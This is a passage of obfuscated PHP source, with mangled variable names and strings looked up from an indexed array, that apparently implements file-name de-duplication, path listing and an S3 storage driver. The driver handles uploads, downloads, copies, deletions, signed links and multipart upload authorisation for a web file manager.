$this->fileOutImage($Ù˜Î´‰, $ï‡˜); } public function fileNameAuto($Šù…ªæª, $ó™©ï²ñ, $ü”«æ± = REPEAT_RENAME, $ÊÍßÙ¨ = false) { $‰»¿÷—» =& $_SERVER[Æ š¦İÈ]; $áõ‡Ú±ë = $Šù…ªæª === $‰»¿÷—»[12] ? $ó™©ï²ñ : rtrim($Šù…ªæª, $‰»¿÷—»[8]) . $‰»¿÷—»[8] . $ó™©ï²ñ; if ($ü”«æ± == REPEAT_REPLACE || !$this->exist($áõ‡Ú±ë) || $ÊÍßÙ¨ && $ü”«æ± != REPEAT_RENAME_FOLDER) { return $ó™©ï²ñ; } if ($ü”«æ± == REPEAT_SKIP) { return !1; } $úæĞì‹ = $‰»¿÷—»[10] . get_path_ext($ó™©ï²ñ); $úæĞì‹ = $úæĞì‹ == $‰»¿÷—»[10] || $ÊÍßÙ¨ ? $‰»¿÷—»[12] : $úæĞì‹; $­ô»Óøğ = 1; $€¾©úÈá = substr($ó™©ï²ñ, 0, strlen($ó™©ï²ñ) - strlen($úæĞì‹)); $„Í ñ‚ê = $€¾©úÈá . "\50{$­ô»Óøğ}\51{$úæĞì‹}"; while ($this->exist(rtrim($Šù…ªæª, $‰»¿÷—»[8]) . $‰»¿÷—»[8] . $„Í ñ‚ê)) { $„Í ñ‚ê = $€¾©úÈá . "\x28{$­ô»Óøğ}\x29{$úæĞì‹}"; $­ô»Óøğ++; } return $„Í ñ‚ê; } private function fileNameAutoList($ ¾óòƒÖ, $€Šæ ¡¿, $Ñ©¢› = false) { $İã¦îÛ =& $_SERVER[Æ š¦İÈ]; $ÚùÛÓ«Ğ = $this->listPath($ ¾óòƒÖ, !0); $ÚùÛÓ«Ğ = array_merge($ÚùÛÓ«Ğ[$İã¦îÛ[77]], $ÚùÛÓ«Ğ[$İã¦îÛ[76]]); $¤¬ÌºŸê = array_to_keyvalue($ÚùÛÓ«Ğ, $İã¦îÛ[12], $İã¦îÛ[32]); $íĞëˆ§ = $İã¦îÛ[10] . get_path_ext($€Šæ ¡¿); $íĞëˆ§ = $íĞëˆ§ == $İã¦îÛ[10] || $Ñ©¢› ? $İã¦îÛ[12] : $íĞëˆ§; $ÓíÚ½‰ß = substr($€Šæ ¡¿, 0, strlen($€Šæ ¡¿) - strlen($íĞëˆ§)); $ñ·ÌµëÆ = $ÓíÚ½‰ß . "\50\60\x29{$íĞëˆ§}"; for ($§µá¸ˆó = 1; $§µá¸ˆó <= count($¤¬ÌºŸê) + 1; $§µá¸ˆó++) { $ñ·ÌµëÆ = $ÓíÚ½‰ß . "\x28{$§µá¸ˆó}\x29{$íĞëˆ§}"; if (!in_array_not_case($ñ·ÌµëÆ, $¤¬ÌºŸê)) { return $ñ·ÌµëÆ; } } return $ñ·ÌµëÆ; } public function listAllFiles($ˆ¬šô‡, $Åüá‹àÂ, $òŒ«ßÌ… = array()) { $ØîŸÍë =& $_SERVER[Æ š¦İÈ]; if (empty($Åüá‹àÂ)) { return array(); } $ëä’ñ‰É = array(); $ˆ¬šô‡ = trim($ˆ¬šô‡, $ØîŸÍë[8]); foreach ($Åüá‹àÂ as $‡“¾ñèà) { $¨œ‰™²Â = ltrim(substr(trim($‡“¾ñèà, $ØîŸÍë[8]), strlen($ˆ¬šô‡)), $ØîŸÍë[8]); $ëä’ñ‰É = array_merge($ëä’ñ‰É, $this->slicePath($¨œ‰™²Â)); } $å¯ÓÏÄç = array(); foreach (array_unique($ëä’ñ‰É) as $‡“¾ñèà) { $ôïˆ‘Ø = array($ØîŸÍë[78] => $this->getPathOuter($ØîŸÍë[8] . $ˆ¬šô‡ . $ØîŸÍë[8] . $‡“¾ñèà), $ØîŸÍë[79] => 1, $ØîŸÍë[80] => 0); if (substr($‡“¾ñèà, -1) != $ØîŸÍë[8]) { $ôïˆ‘Ø[$ØîŸÍë[79]] = 0; $’¬òƒÙ¸ = $this->getPath($ˆ¬šô‡ . $ØîŸÍë[8] . $‡“¾ñèà); $ôïˆ‘Ø[$ØîŸÍë[80]] = isset($òŒ«ßÌ…[$’¬òƒÙ¸]) ? $òŒ«ßÌ…[$’¬òƒÙ¸] : $this->size($’¬òƒÙ¸); } $å¯ÓÏÄç[] = $ôïˆ‘Ø; } return $å¯ÓÏÄç; } public function slicePath($ıâ¥•²) { $·ï†Õ˜Ø =& $_SERVER[Æ š¦İÈ]; $ßÜÆÌ³½ = explode($·ï†Õ˜Ø[8], trim($ıâ¥•², $·ï†Õ˜Ø[8])); $—½š¶ŒŞ = 0; do { ++$—½š¶ŒŞ; $Õ’…¯£÷[] = implode($·ï†Õ˜Ø[8], array_slice($ßÜÆÌ³½, 0, $—½š¶ŒŞ)) . $·ï†Õ˜Ø[8]; } while ($—½š¶ŒŞ < count($ßÜÆÌ³½)); $Õ’…¯£÷[count($ßÜÆÌ³½) - 1] = $ıâ¥•²; return $Õ’…¯£÷; } public function getHost() { $¶àÒŒâ =& $_SERVER[Æ š¦İÈ]; $şûËÒ¾– = parse_url(trim($this->domain, $¶àÒŒâ[8])); $Œ ïŞğ» = isset($şûËÒ¾–[$¶àÒŒâ[175]]) ? $şûËÒ¾–[$¶àÒŒâ[175]] : http_type(); $Ùê§à¢Í = isset($şûËÒ¾–[$¶àÒŒâ[176]]) ? $şûËÒ¾–[$¶àÒŒâ[176]] : $şûËÒ¾–[$¶àÒŒâ[78]]; if (isset($şûËÒ¾–[$¶àÒŒâ[177]])) { $Ùê§à¢Í .= $¶àÒŒâ[4] . $şûËÒ¾–[$¶àÒŒâ[177]]; } return $Œ ïŞğ» . $¶àÒŒâ[178] . $Ùê§à¢Í; } public function pathEncode($µ‡ŸïÖ) { $ä¢Û›’˜ =& $_SERVER[Æ š¦İÈ]; return str_replace($ä¢Û›’˜[179], $ä¢Û›’˜[8], rawurlencode($µ‡ŸïÖ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($ŠÒ†Ë—¾) { set_timeout(); require_once SDK_DIR . $_SERVER[Æ š¦İÈ][180]; parent::__construct(); $this->_init($ŠÒ†Ë—¾); } public function _init($Á¬æîşÕ) { foreach ($Á¬æîşÕ as $†µ ‰Éß => $‡äàÉŸ) { if (isset($this->{$†µ ‰Éß})) { $this->{$†µ ‰Éß} = $‡äàÉŸ; } } $this->endpoint = $Á¬æîşÕ[$_SERVER[Æ š¦İÈ][181]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($÷Îœï  = "\x76\64") { $this->signVer = $÷Îœï ; $this->client->setSignatureVersion($÷Îœï ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $±›¶œá§ =& $_SERVER[Æ š¦İÈ]; $»ØİÌ©§ = $this->getBucketCors(); if (!$»ØİÌ©§ || !is_array($»ØİÌ©§)) { return !1; } if ($»ØİÌ©§[$±›¶œá§[182]] != $±›¶œá§[183] || $»ØİÌ©§[$±›¶œá§[184]] != $±›¶œá§[183]) { return !1; } $ŠÁ‰·Šˆ = array_map($±›¶œá§[185], $»ØİÌ©§[$±›¶œá§[186]]); if (!is_array($ŠÁ‰·Šˆ)) { $ŠÁ‰·Šˆ = array(); } $¸—½ö Š = array($±›¶œá§[187], $±›¶œá§[188], $±›¶œá§[189], $±›¶œá§[190], $±›¶œá§[191]); $×‚ííœ§ = array_diff($¸—½ö Š, $ŠÁ‰·Šˆ); return empty($×‚ííœ§); } public function mkfile($æÏËô¥, $ı½æ¸ù‹ = '', $Ê§»‚› = REPEAT_RENAME) { $ÂË¬˜È = $this->setContent($æÏËô¥, $ı½æ¸ù‹); if ($ÂË¬˜È !== !1) { return $this->getPathOuter($æÏËô¥); } return !1; } public function mkdir($¸®»¬è, $íÀâ‰ş = REPEAT_SKIP) { $”à—˜èå =& $_SERVER[Æ š¦İÈ]; if (empty($¸®»¬è) && $¸®»¬è !== $”à—˜èå[192]) { return !1; } if ($this->_isFolder($¸®»¬è)) { return $this->getPathOuter($¸®»¬è); } $óºšââ— = $this->setContent($¸®»¬è, $”à—˜èå[12], !0); if ($óºšââ— !== !1) { return $this->getPathOuter($¸®»¬è); } return !1; } public function copyFile($ëëØó¹¸, $˜³šĞœ, $¥ó±æ¡ñ = array()) { $‰™‹ğ =& $_SERVER[Æ š¦İÈ]; $²íàñ¥‡ = $this->objectMeta($ëëØó¹¸); if (!$²íàñ¥‡) { return !1; } if ($²íàñ¥‡[$‰™‹ğ[80]] <= 1024 * 1024 * 200) { $€¢¤şê« = $this->client->copyObject($this->bucket, $ëëØó¹¸, $this->bucket, $˜³šĞœ, $‰™‹ğ[193], $¥ó±æ¡ñ); } else { $€¢¤şê« = $this->client->multiCopyObject($this->bucket, $ëëØó¹¸, $this->bucket, $˜³šĞœ, $¥ó±æ¡ñ); } $€¢¤şê« = $€¢¤şê« ? $this->getPathOuter($˜³šĞœ) : !1; return $€¢¤şê«; } public function moveFile($š­¥€, $åÚÓ¹Ø‚) { if ($this->copyFile($š­¥€, $åÚÓ¹Ø‚)) { $this->delFile($š­¥€); return $this->getPathOuter($åÚÓ¹Ø‚); } return !1; } public function delFile($ÄÔ¿®‚) { return $this->client->deleteObject($this->bucket, $ÄÔ¿®‚); } public function delFolder($“Ö¦¥†ß) { $Ìıñ„û =& $_SERVER[Æ š¦İÈ]; if (!$this->exist($“Ö¦¥†ß)) { return !0; } $this->listItemCache = !1; $³Å‹Ìíö = $this->fileList($“Ö¦¥†ß); $this->listItemCache = !0; $ˆ¸àÍÃ¢ = trim($“Ö¦¥†ß, $Ìıñ„û[8]) . $Ìıñ„û[8]; if (!empty($“Ö¦¥†ß) && $“Ö¦¥†ß !== $Ìıñ„û[192] && !in_array($ˆ¸àÍÃ¢, $³Å‹Ìíö[$Ìıñ„û[77]])) { $³Å‹Ìíö[$Ìıñ„û[77]][] = $ˆ¸àÍÃ¢; } $‰¡Ûáµó = $this->delByBatch($³Å‹Ìíö[$Ìıñ„û[76]]); if (!$‰¡Ûáµó) { return !1; } $‰¡Ûáµó = $this->delByBatch($³Å‹Ìíö[$Ìıñ„û[77]]); if (!$‰¡Ûáµó) { return !1; } return $this->delFile($ˆ¸àÍÃ¢); } private function delByBatch($øóïœëñ) { foreach (array_chunk($øóïœëñ, 1000) as $à±Ÿ–Ë½) { $êÂ¸³ƒ = $this->client->deleteObjects($this->bucket, $à±Ÿ–Ë½); if (!$êÂ¸³ƒ) { return !1; } } return !0; } public function rename($íù‹şÊ¥, $š‰‘«Ÿ¸) { return $this->renameObject($íù‹şÊ¥, $š‰‘«Ÿ¸); } public function listPath($ÅÙ„ÒÈÒ, $ÏŞÁ¢ª¬ = false) { $êôÛä =& $_SERVER[Æ š¦İÈ]; $êë‘úÊŠ = $this->fileList($ÅÙ„ÒÈÒ, $êôÛä[8], !0); foreach ($êë‘úÊŠ[$êôÛä[77]] as $¾¶ö‰Ø => $Øï—Ò«) { $êë‘úÊŠ[$êôÛä[77]][$¾¶ö‰Ø] = $this->folderInfo($Øï—Ò«, $ÏŞÁ¢ª¬); } foreach ($êë‘úÊŠ[$êôÛä[76]] as $¾¶ö‰Ø => $Øï—Ò«) { $êë‘úÊŠ[$êôÛä[76]][$¾¶ö‰Ø] = $this->fileInfo($Øï—Ò«[$êôÛä[32]], $ÏŞÁ¢ª¬, $Øï—Ò«); } return $êë‘úÊŠ; } private function fileInfo($‚¤ÁµÁä, $âÃıˆ¼¡ = false, $¯ˆ¡œ¶¥ = array()) { $¢¤ˆõ‘Õ =& $_SERVER[Æ š¦İÈ]; $•‘ìØ´• = array($¢¤ˆõ‘Õ[32] => $this->pathThis($‚¤ÁµÁä), $¢¤ˆõ‘Õ[78] => $this->getPathOuter($‚¤ÁµÁä), $¢¤ˆõ‘Õ[33] => $¢¤ˆõ‘Õ[194], $¢¤ˆõ‘Õ[169] => $this->ext($‚¤ÁµÁä), $¢¤ˆõ‘Õ[80] => isset($¯ˆ¡œ¶¥[$¢¤ˆõ‘Õ[80]]) ? $¯ˆ¡œ¶¥[$¢¤ˆõ‘Õ[80]] : 0); if ($âÃıˆ¼¡) { return $•‘ìØ´•; } $•‘ìØ´•[$¢¤ˆõ‘Õ[195]] = $•‘ìØ´•[$¢¤ˆõ‘Õ[86]] = 0; $•‘ìØ´•[$¢¤ˆõ‘Õ[196]] = $•‘ìØ´•[$¢¤ˆõ‘Õ[197]] = !0; if (empty($¯ˆ¡œ¶¥)) { $¯ˆ¡œ¶¥ = $this->objectMeta($‚¤ÁµÁä); if (!$¯ˆ¡œ¶¥) { return $•‘ìØ´•; } } if (isset($¯ˆ¡œ¶¥[$¢¤ˆõ‘Õ[198]])) { $•‘ìØ´•[$¢¤ˆõ‘Õ[86]] = $¯ˆ¡œ¶¥[$¢¤ˆõ‘Õ[198]]; } if (isset($¯ˆ¡œ¶¥[$¢¤ˆõ‘Õ[80]])) { $•‘ìØ´•[$¢¤ˆõ‘Õ[80]] = $¯ˆ¡œ¶¥[$¢¤ˆõ‘Õ[80]]; } return $•‘ìØ´•; } private function folderInfo($ªİü, $ˆÓ©Ä»± = false) { $ÚêíÏĞ =& $_SERVER[Æ š¦İÈ]; $¶Óí²–Í = array($ÚêíÏĞ[32] => $this->pathThis($ªİü), $ÚêíÏĞ[78] => $this->getPathOuter($ÚêíÏĞ[8] . $ªİü), $ÚêíÏĞ[33] => $ÚêíÏĞ[79]); if ($ˆÓ©Ä»±) { return $¶Óí²–Í; } $¶Óí²–Í[$ÚêíÏĞ[195]] = $¶Óí²–Í[$ÚêíÏĞ[86]] = 0; $¶Óí²–Í[$ÚêíÏĞ[196]] = $¶Óí²–Í[$ÚêíÏĞ[197]] = !0; if ($ªİü == $ÚêíÏĞ[12]) { return $¶Óí²–Í; } $ªİü = trim($ªİü, $ÚêíÏĞ[8]) . $ÚêíÏĞ[8]; $‚ª€Ÿ§ = $this->objectMeta($ªİü); if (isset($‚ª€Ÿ§[$ÚêíÏĞ[198]])) { $¶Óí²–Í[$ÚêíÏĞ[195]] = $‚ª€Ÿ§[$ÚêíÏĞ[198]]; } return $¶Óí²–Í; } private function fileList($‚Ñ–»‡§, $Ê³Òá¤ = '', $¹§³ß‰ğ = 0) { $àœÑ›¾í =& $_SERVER[Æ š¦İÈ]; $ˆëö¢ø = rtrim($‚Ñ–»‡§, $àœÑ›¾í[8]) . $àœÑ›¾í[8]; $Š–æ‡ã€ = $this->listObjs($ˆëö¢ø, null, null, $Ê³Òá¤); if (!$Š–æ‡ã€) { return array($àœÑ›¾í[77] => array(), $àœÑ›¾í[76] => array()); } $Òêãê¼à = $this->listItemCache === !1 ? !1 : !0; $‚ä‡Š€¸ = $Äø†¼¥¶ = array(); foreach ($Š–æ‡ã€[$àœÑ›¾í[199]] as $¨¹ÜÅ«) { $ÜĞõ±Æ¶ = $¨¹ÜÅ«[$àœÑ›¾í[32]]; if ($ÜĞõ±Æ¶ == $ˆëö¢ø) { continue; } $ØƒÃ¼‡ª = isset($¨¹ÜÅ«[$àœÑ›¾í[80]]) ? $¨¹ÜÅ«[$àœÑ›¾í[80]] : 0; $‚¦Ô²Ë• = $ØƒÃ¼‡ª == 0 && substr($ÜĞõ±Æ¶, strlen($ÜĞõ±Æ¶) - 1, 1) == $àœÑ›¾í[8] ? !0 : !1; if ($Òêãê¼à) { $this->cacheMethod($àœÑ›¾í[200], $ÜĞõ±Æ¶, $‚¦Ô²Ë•); $this->cacheMethod($àœÑ›¾í[201], $ÜĞõ±Æ¶, $¨¹ÜÅ«); } if ($‚¦Ô²Ë•) { $‚ä‡Š€¸[] = $ÜĞõ±Æ¶; continue; } $Äø†¼¥¶[] = $¹§³ß‰ğ ? $¨¹ÜÅ« : $ÜĞõ±Æ¶; } foreach ($Š–æ‡ã€[$àœÑ›¾í[202]] as $¨¹ÜÅ«) { $‚ä‡Š€¸[] = $¨¹ÜÅ«[$àœÑ›¾í[32]]; if ($Òêãê¼à) { $this->cacheMethod($àœÑ›¾í[200], $¨¹ÜÅ«[$àœÑ›¾í[32]], !0); } } if ($Òêãê¼à) { $this->cacheMethod($àœÑ›¾í[200], $‚Ñ–»‡§, !0); } return array($àœÑ›¾í[77] => $‚ä‡Š€¸, $àœÑ›¾í[76] => $Äø†¼¥¶); } private function listObjs($ä‚âš•ô, $¼ğ¥Ú‰ƒ = null, $ÀòËˆÁõ = null, $›µ—Ëà = null) { $ù¶æçÂ =& $_SERVER[Æ š¦İÈ]; $ä‚âš•ô = trim($ä‚âš•ô, $ù¶æçÂ[8]); $ĞÇßç’ = empty($ä‚âš•ô) && $ä‚âš•ô !== $ù¶æçÂ[192] ? $ù¶æçÂ[12] : $ä‚âš•ô . $ù¶æçÂ[8]; return $this->client->getBucket($this->bucket, $ĞÇßç’, $¼ğ¥Ú‰ƒ, $ÀòËˆÁõ, $›µ—Ëà, !0); } public function has($‡‡è †À, $ÅË¶ø´© = false, $á·õºâç = true) { $”š½ ¨ï =& $_SERVER[Æ š¦İÈ]; $‡‡è †À = trim($‡‡è †À, $”š½ ¨ï[8]); $áşğíÆğ = empty($‡‡è †À) && $‡‡è †À !== $”š½ ¨ï[192] ? $”š½ ¨ï[12] : $‡‡è †À . $”š½ ¨ï[8]; $¥Ôƒª«Ÿ = null; $ß±úÌ¥Í = 500; $¾£Öá–¹ = $”š½ ¨ï[8]; $Í·Àƒ Œ = $ÒË¶ğ±‚ = array(); while (!0) { $ëé½€çÜ = $this->listObjs($‡‡è †À, $¥Ôƒª«Ÿ, $ß±úÌ¥Í, $¾£Öá–¹); if (!$ëé½€çÜ) { break; } $¥Ôƒª«Ÿ = $ëé½€çÜ[$”š½ ¨ï[203]]; $öƒŒĞê = $ëé½€çÜ[$”š½ ¨ï[199]]; $ÎÔÍ‡ï¶ = $ëé½€çÜ[$”š½ ¨ï[202]]; if (empty($öƒŒĞê) && empty($ÎÔÍ‡ï¶)) { break; } if (count($öƒŒĞê) == 1 && $öƒŒĞê[0][$”š½ ¨ï[32]] == $áşğíÆğ) { break; } if ($ÅË¶ø´©) { if (count($öƒŒĞê)) { $öƒŒĞê = array_column($öƒŒĞê, $”š½ ¨ï[32]); $Í·Àƒ Œ = array_merge($Í·Àƒ Œ, $öƒŒĞê); } if (count($ÎÔÍ‡ï¶)) { $ÎÔÍ‡ï¶ = array_column($ÎÔÍ‡ï¶, $”š½ ¨ï[32]); $ÒË¶ğ±‚ = array_merge($ÒË¶ğ±‚, $ÎÔÍ‡ï¶); } if ($¥Ôƒª«Ÿ === null) { break; } continue; } if ($á·õºâç) { if (!empty($öƒŒĞê)) { if (count($öƒŒĞê) > 1 || isset($öƒŒĞê[0][$”š½ ¨ï[32]]) && $öƒŒĞê[0][$”š½ ¨ï[32]] != $áşğíÆğ) { return !0; } } } else { if (!empty($ÎÔÍ‡ï¶)) { return !0; } } if ($¥Ôƒª«Ÿ === null) { break; } } if ($ÅË¶ø´©) { $Í·Àƒ Œ = array_diff($Í·Àƒ Œ, array($áşğíÆğ)); $Í·Àƒ Œ = count(array_unique($Í·Àƒ Œ)); $ÒË¶ğ±‚ = count(array_unique($ÒË¶ğ±‚)); return array($”š½ ¨ï[204] => $Í·Àƒ Œ, $”š½ ¨ï[205] => $ÒË¶ğ±‚); } return !1; } public function listAll($èãã­Ê) { $÷œıœ™È =& $_SERVER[Æ š¦İÈ]; $‚äŸŞ¤— = $this->fileList($èãã­Ê, $÷œıœ™È[12], !0); $»¯Ì‡Ô» = array(); foreach ($‚äŸŞ¤—[$÷œıœ™È[76]] as $¶©õêìè) { $»¯Ì‡Ô»[$¶©õêìè[$÷œıœ™È[32]]] = $¶©õêìè[$÷œıœ™È[80]]; } foreach ($‚äŸŞ¤—[$÷œıœ™È[77]] as $¶©õêìè) { if (is_string($¶©õêìè)) { $»¯Ì‡Ô»[$¶©õêìè] = 0; } } return $this->listAllFiles($èãã­Ê, array_keys($»¯Ì‡Ô»), $»¯Ì‡Ô»); } public function canRead($´ä½‘©) { $¨ˆ“¨Úâ =& $_SERVER[Æ š¦İÈ]; $“¤©œÏ = $this->client->getAccessControlPolicy($this->bucket, $´ä½‘©); if (!$“¤©œÏ) { return !1; } return in_array($“¤©œÏ, array($¨ˆ“¨Úâ[206], $¨ˆ“¨Úâ[207], $¨ˆ“¨Úâ[208])) ? !0 : !1; } public function canWrite($º´¬¥«) { $àÍÚ•ä› =& $_SERVER[Æ š¦İÈ]; $¿Ï¼ÒÚ = $this->client->getAccessControlPolicy($this->bucket, $º´¬¥«); if (!$¿Ï¼ÒÚ) { return !1; } return in_array($¿Ï¼ÒÚ, array($àÍÚ•ä›[206], $àÍÚ•ä›[207])) ? !0 : !1; } public function getContent($©ù¥÷å) { return $this->client->getObject($this->bucket, $©ù¥÷å); } public function setContent($ŠÉïïì¸, $…×·° = '', $Á•Ï¦¼ = false) { $äı‚¢¨ =& $_SERVER[Æ š¦İÈ]; $ŠÉïïì¸ = $Á•Ï¦¼ ? trim($ŠÉïïì¸, $äı‚¢¨[8]) . $äı‚¢¨[8] : $ŠÉïïì¸; $¾Ï¼‘¡‘ = get_file_mime(get_path_ext($ŠÉïïì¸)); $¼Ş½ñÜê = $this->client->putObject($…×·°, $this->bucket, $ŠÉïïì¸, $äı‚¢¨[193], array(), $¾Ï¼‘¡‘); if (!$¼Ş½ñÜê) { return !1; } if ($Á•Ï¦¼) { return !0; } $this->cacheMethod(null, null); $¼Ş½ñÜê = $this->copyFile($ŠÉïïì¸, $ŠÉïïì¸, array($äı‚¢¨[209] => $¼Ş½ñÜê[$äı‚¢¨[210]])); return $¼Ş½ñÜê ? !0 : !1; } public function fileSubstr($¸¦ä¡¯´, $Û·‹ÇØ¨, $Ğ§Ëô˜î) { $ôºŞ„¦¡ = $Û·‹ÇØ¨ + $Ğ§Ëô˜î - 1; return $this->client->getObject($this->bucket, $¸¦ä¡¯´, array($_SERVER[Æ š¦İÈ][211] => "\142\171\164\x65\x73\75{$Û·‹ÇØ¨}\55{$ôºŞ„¦¡}")); } public function upload($³ îş‰©, $·åüÎô, $è†Æ©Œå = false, $¤ØŒÖñª = REPEAT_REPLACE) { $¥Ãô¶ô„ =& $_SERVER[Æ š¦İÈ]; $í×šàıÀ = array($¥Ãô¶ô„[209] => @md5_file($·åüÎô)); $ÇÃÊ’­È = array($¥Ãô¶ô„[212] => get_file_mime(get_path_ext($³ îş‰©))); if (IO::size($·åüÎô) <= 1024 * 1024 * 200) { $Èö¯üìœ = $this->client->putObjectFile($·åüÎô, $this->bucket, $³ îş‰©, $¥Ãô¶ô„[193], $í×šàıÀ, $ÇÃÊ’­È); return !empty($Èö¯üìœ) ? $this->getPathOuter($³ îş‰©) : !1; } $¤´ë­Ë‹ = $this->client->multiUploadObject($·åüÎô, $this->bucket, trim($³ îş‰©, $¥Ãô¶ô„[8]), $í×šàıÀ, $ÇÃÊ’­È); return $¤´ë­Ë‹ ? $this->getPathOuter($³ îş‰©) : !1; } public function download($ƒÂ™ò¥Ò, $Èğ›‡¿º) { if (!@is_dir($this->pathFather($Èğ›‡¿º)) && !IO::mkdir($this->pathFather($Èğ›‡¿º))) { return !1; } $ºŠ¾Ì¤ã = $this->client->getObject($this->bucket, $ƒÂ™ò¥Ò, array(), $Èğ›‡¿º); return $ºŠ¾Ì¤ã !== !1 ? $Èğ›‡¿º : !1; } public function link($ã¢˜¹İƒ, $Ôá—ñÅ° = array()) { $çÒ£‰Ÿü =& $_SERVER[Æ š¦İÈ]; if ($this->signVer == $çÒ£‰Ÿü[213]) { return $this->client->getAuthenticatedURL($this->bucket, $ã¢˜¹İƒ, 3600 * 12, $Ôá—ñÅ°); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ã¢˜¹İƒ, $çÒ£‰Ÿü[8]), 3600 * 12, $this->region, array(), !0, $Ôá—ñÅ°); } public function fileOut($óŞìŠŠÛ, $é¿”‰¹ = false, $Çã¯Ê›İ = false, $ÎÌ = '') { $•™î† =& $_SERVER[Æ š¦İÈ]; if ($this->isFileOutServer()) { return $this->fileOutServer($óŞìŠŠÛ, $é¿”‰¹, $Çã¯Ê›İ, $ÎÌ); } if (!$Çã¯Ê›İ) { $Çã¯Ê›İ = $this->pathThis($óŞìŠŠÛ); } $ØóÓìµî = get_file_mime(get_path_ext($Çã¯Ê›İ)); if ($ØóÓìµî == $•™î†[214]) { return parent::fileOut($óŞìŠŠÛ, $é¿”‰¹, $Çã¯Ê›İ, $ÎÌ); } $¼ŸÚœÆ = array($•™î†[215] => $ØóÓìµî); if ($é¿”‰¹) { $¼ŸÚœÆ[$•™î†[216]] = $•™î†[217] . rawurlencode($Çã¯Ê›İ); } else { } $˜èÈÇºù = $this->link($óŞìŠŠÛ, $¼ŸÚœÆ); $this->fileOutLink($˜èÈÇºù); } public function fileOutServer($¬ì—Æ­¬, $»ÈšÁæÙ = false, $˜¼›”ê¦ = false, $Î˜Ò¾™÷ = '') { parent::fileOut($¬ì—Æ­¬, $»ÈšÁæÙ, $˜¼›”ê¦, $Î˜Ò¾™÷); } public function fileOutImageServer($üÔ—‹, $Öã›ËŒ§ = 250) { parent::fileOutImage($üÔ—‹, $Öã›ËŒ§); } public function hashMd5($Ï«ÔÉ¹, $Ô¯˜Ô = '') { $Ğ¾ë¢ó˜ =& $_SERVER[Æ š¦İÈ]; $¡¹©ìÄ› = $this->objectMeta($Ï«ÔÉ¹); if (!$¡¹©ìÄ›) { return !1; } $Ô¯˜Ô = $Ô¯˜Ô ? $Ô¯˜Ô : _get($¡¹©ìÄ›, $Ğ¾ë¢ó˜[218]); $Ô¯˜Ô = $Ô¯˜Ô ? $Ô¯˜Ô : _get($¡¹©ìÄ›, $Ğ¾ë¢ó˜[210], $Ğ¾ë¢ó˜[12]); return $Ô¯˜Ô; } public function uploadFormData($Ç¿úùÔ, $ù¿ø—éà = 3600) { $úüÇÇŠÊ =& $_SERVER[Æ š¦İÈ]; $ŒÄ„óˆ = $this->pathFather($Ç¿úùÔ); $ öø¹å´ = $this->client->getHttpUploadPostParams($this->bucket, $ŒÄ„óˆ, $úüÇÇŠÊ[193], $ù¿ø—éà); return array_merge((array) $ öø¹å´, array($úüÇÇŠÊ[176] => $this->getHost())); } public function multiUploadFormData($ÌÚ¹“€, $ù ©ğÜ = 3600) { $µ¹†¨Òõ =& $_SERVER[Æ š¦İÈ]; $øÂĞŠ‘ = gmdate($µ¹†¨Òõ[219]); $Í„æô Ê = array(); $¡Àó»ĞÆ = $this->client->getUploadId($this->bucket, $ÌÚ¹“€, $Í„æô Ê); if (!$¡Àó»ĞÆ) { return !1; } return array($µ¹†¨Òõ[220] => $¡Àó»ĞÆ, $µ¹†¨Òõ[176] => $this->getHost() . $µ¹†¨Òõ[8] . $this->pathEncode($ÌÚ¹“€), $µ¹†¨Òõ[221] => $øÂĞŠ‘, $µ¹†¨Òõ[95] => $ÌÚ¹“€); } public function multiUploadAuthData($­Æè¯ª, $…°¿Â£Š = array()) { $Õ‡òÉ„Ü =& $_SERVER[Æ š¦İÈ]; $œÜ›–½ = isset($…°¿Â£Š[$Õ‡òÉ„Ü[221]]) ? $…°¿Â£Š[$Õ‡òÉ„Ü[221]] : gmdate($Õ‡òÉ„Ü[219]); $â¡ŞÚ€¨ = isset($…°¿Â£Š[$Õ‡òÉ„Ü[169]]) ? $…°¿Â£Š[$Õ‡òÉ„Ü[169]] : $Õ‡òÉ„Ü[12]; $Úà›ëÇÏ = $…°¿Â£Š[$Õ‡òÉ„Ü[95]]; unset($…°¿Â£Š[$Õ‡òÉ„Ü[95]]); if (isset($…°¿Â£Š[$Õ‡òÉ„Ü[222]])) { $…°¿Â£Š[$Õ‡òÉ„Ü[221]] = $œÜ›–½; return $this->listUploadParts($Úà›ëÇÏ, $…°¿Â£Š); } $“¯ô·Ó” = array($Õ‡òÉ„Ü[223], $Õ‡òÉ„Ü[12], $Õ‡òÉ„Ü[120], $Õ‡òÉ„Ü[12], "\170\55\141\155\172\55\144\141\x74\x65\72{$œÜ›–½}", $Õ‡òÉ„Ü[8] . $this->bucket . $Õ‡òÉ„Ü[8] . $this->pathEncode($Úà›ëÇÏ) . $â¡ŞÚ€¨); if (strpos($â¡ŞÚ€¨, $Õ‡òÉ„Ü[224]) === 0) { $“¯ô·Ó”[0] = $Õ‡òÉ„Ü[225]; } if (isset($…°¿Â£Š[$Õ‡òÉ„Ü[226]]) && $…°¿Â£Š[$Õ‡òÉ„Ü[226]] == $Õ‡òÉ„Ü[227]) { $“¯ô·Ó”[0] = $Õ‡òÉ„Ü[227]; } $—°Î¢úÒ = implode($Õ‡òÉ„Ü[228], $“¯ô·Ó”); $ È ¨‡ş = base64_encode(hash_hmac($Õ‡òÉ„Ü[229], $—°Î¢úÒ, $this->secret, !0)); $¿ÓÕ®› = $Õ‡òÉ„Ü[230] . $this->accessKey . $Õ‡òÉ„Ü[4] . $ È ¨‡ş; if (strpos($â¡ŞÚ€¨, $Õ‡òÉ„Ü[224]) === 0) { return array($Õ‡òÉ„Ü[231] => $¿ÓÕ®›, $Õ‡òÉ„Ü[221] => $œÜ›–½); } return $¿ÓÕ®›; } public function listUploadParts($ÌóØ²Æ†, $ˆ«ê´é· = array()) { $û‰Š°— =& $_SERVER[Æ š¦İÈ]; $×³¥‡¦ = str_replace($û‰Š°—[232], $û‰Š°—[12], $ˆ«ê´é·[$û‰Š°—[169]]); $ÅëøÆé = $this->client->listParts($this->bucket, $ÌóØ²Æ†, $×³¥‡¦); if 